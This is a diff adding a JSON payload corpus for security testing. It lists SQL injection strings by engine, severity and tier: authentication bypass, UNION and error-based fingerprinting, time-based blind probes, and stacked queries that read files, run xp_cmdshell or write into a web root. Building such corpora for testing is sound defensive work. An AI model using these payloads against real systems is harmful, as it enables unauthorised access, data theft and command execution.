@@ -1,0 +1,30 @@
+{
+  "schema": "12-schemas/payload.schema.json",
+  "corpus_id": "PL-WEB-SQLI",
+  "version": "1.0.0",
+  "provenance": { "source": "PAT", "ref": "master@2026-01-15", "secondary": "SQLMAP@1.9.1" },
+  "payloads": [
+    { "payload_id": "PL-WEB-SQLI-0001", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "generic", "payload": "' OR '1'='1",              "severity": "high",   "tags": ["auth-bypass", "boolean"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SQLI-0002", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "generic", "payload": "' OR '1'='1'-- -",          "severity": "high",   "tags": ["auth-bypass", "boolean"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SQLI-0003", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "mysql",   "payload": "' OR '1'='1'#",             "severity": "high",   "tags": ["auth-bypass", "boolean"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SQLI-0004", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "generic", "payload": "admin'-- -",                "severity": "high",   "tags": ["auth-bypass"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SQLI-0005", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "generic", "payload": "') OR ('1'='1",               "severity": "high",   "tags": ["auth-bypass", "parenthesis"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SQLI-0006", "cwe_id": "CWE-89", "context": "numeric", "surface": "parameter", "engine": "generic", "payload": "1 OR 1=1",                   "severity": "high",   "tags": ["auth-bypass", "boolean"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SQLI-0010", "cwe_id": "CWE-89", "context": "identifier", "surface": "parameter", "engine": "generic", "payload": "ORDER BY 10",            "severity": "info",   "tags": ["column-mapping"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SQLI-0020", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "generic", "payload": "' UNION SELECT NULL-- -",    "severity": "high",   "tags": ["union", "column-mapping"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SQLI-0021", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "generic", "payload": "' UNION SELECT NULL,NULL-- -", "severity": "high",  "tags": ["union", "column-mapping"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SQLI-0022", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "generic", "payload": "' UNION SELECT NULL,NULL,NULL-- -", "severity": "high", "tags": ["union", "column-mapping"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SQLI-0023", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "mysql",   "payload": "' UNION SELECT user(),version()-- -", "severity": "critical", "tags": ["union", "fingerprint"], "classification": "T1" },
+    { "payload_id": "PL-WEB-SQLI-0050", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "mysql",   "payload": "' AND extractvalue(1,concat(0x7e,version()))-- -", "severity": "high", "tags": ["error-based", "fingerprint"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SQLI-0051", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "mssql",   "payload": "' AND 1=CONVERT(int,(SELECT @@version))-- -", "severity": "high", "tags": ["error-based", "fingerprint"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SQLI-0052", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "postgresql", "payload": "' AND 1=CAST((SELECT version()) AS int)-- -", "severity": "high", "tags": ["error-based", "fingerprint"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SQLI-0080", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "mysql",   "payload": "' AND SLEEP(5)-- -",         "severity": "medium", "tags": ["time-based", "blind"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SQLI-0081", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "postgresql", "payload": "' AND pg_sleep(5)-- -",  "severity": "medium", "tags": ["time-based", "blind"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SQLI-0082", "cwe_id": "CWE-89", "context": "query",   "surface": "parameter", "engine": "mssql",   "payload": "'; WAITFOR DELAY '0:0:5'-- -", "severity": "medium", "tags": ["time-based", "blind"], "classification": "T1" },
+    { "payload_id": "PL-WEB-SQLI-0090", "cwe_id": "CWE-89", "context": "header",  "surface": "header",    "engine": "generic", "payload": "User-Agent: ' OR '1'='1",   "severity": "high",   "tags": ["header-injection", "logi"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SQLI-0091", "cwe_id": "CWE-89", "context": "query",   "surface": "cookie",    "engine": "generic", "payload": "Cookie: sess=' OR '1'='1",   "severity": "high",   "tags": ["cookie", "auth-bypass"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SQLI-0100", "cwe_id": "CWE-89", "context": "stack",   "surface": "parameter", "engine": "mysql",   "payload": "'; SELECT LOAD_FILE(CONCAT('\\\\\\\\','C:\\\\\\\\x.txt'))-- -", "severity": "critical", "tags": ["oob", "file-read"], "classification": "T2" },
+    { "payload_id": "PL-WEB-SQLI-0101", "cwe_id": "CWE-89", "context": "stack",   "surface": "parameter", "engine": "mssql",   "payload": "'; EXEC xp_cmdshell('whoami')-- -", "severity": "critical", "tags": ["rce", "stack"], "classification": "T2" },
+    { "payload_id": "PL-WEB-SQLI-0102", "cwe_id": "CWE-89", "context": "stack",   "surface": "parameter", "engine": "mysql",   "payload": "'; SELECT 'x' INTO OUTFILE '/var/www/html/x.txt'-- -", "severity": "critical", "tags": ["rce", "file-write", "destructive"], "classification": "T2" }
+  ]
+}
